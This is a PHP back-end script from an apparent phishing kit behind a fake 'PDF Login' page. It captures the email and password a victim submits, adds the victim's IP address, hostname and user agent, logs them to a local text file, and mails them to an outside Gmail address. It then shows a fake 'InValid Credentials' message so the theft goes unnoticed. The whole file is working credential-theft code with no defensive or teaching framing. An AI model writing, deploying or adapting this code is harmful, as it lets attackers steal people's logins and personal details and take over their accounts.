<?php
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);


	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| PDF Login |--------------|\n";
	$message .= "Email          : ".$email."\n";
	$message .= "Pass           : ".$password."\n";
	$message .= "|----------- I N F O | I P ----------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD --------------|\n";
	$send = "1234567london7@gmail.com";
	$subject = "Login PDF : $ip";$file = fopen("./cool.txt","a"); 
	fwrite($file,$message); 
    mail($send, $subject, $message);   
	$signal = 'ok';
	$msg = 'InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);







?>